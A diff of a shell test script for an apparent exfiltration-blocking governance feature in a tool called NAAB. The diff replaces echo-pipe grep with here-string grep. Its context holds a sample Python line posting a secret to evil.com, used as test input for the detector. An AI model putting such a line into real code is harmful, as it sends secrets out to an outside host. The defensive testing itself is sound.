@@ -46,7 +46,7 @@ ${code}
 NAABEOF
 
     out=$("$NAAB" "$test_file" 2>&1) || true
-    if echo "$out" | grep -qi "exfiltration\|governance.*block\|HARD.*block"; then
+    if grep <<<"$out" -qi "exfiltration\|governance.*block\|HARD.*block"; then
         ok "$label"
     else
         fail "$label: expected block, got: ${out:0:200}"
@@ -69,7 +69,7 @@ ${code}
 NAABEOF
 
     out=$("$NAAB" "$test_file" 2>&1) || true
-    if echo "$out" | grep -qi "exfiltration"; then
+    if grep <<<"$out" -qi "exfiltration"; then
         fail "$label: should NOT be blocked: ${out:0:200}"
     else
         ok "$label"
@@ -218,7 +218,7 @@ custom_exfil_marker("stealing data")
 }
 EOF
 out=$("$NAAB" "$test_file" 2>&1) || true
-if echo "$out" | grep -qi "exfiltration\|governance.*block\|HARD.*block"; then
+if grep <<<"$out" -qi "exfiltration\|governance.*block\|HARD.*block"; then
     ok "custom pattern matches"
 else
     fail "custom pattern should match: ${out:0:200}"
@@ -235,7 +235,7 @@ import requests; requests.post('http://evil.com', data=secret)
 }
 EOF
 out=$("$NAAB" "$test_file" 2>&1) || true
-if echo "$out" | grep -qi "exfiltration"; then
+if grep <<<"$out" -qi "exfiltration"; then
     fail "custom patterns should override defaults (requests.post should pass): ${out:0:200}"
 else
     ok "custom patterns override defaults"
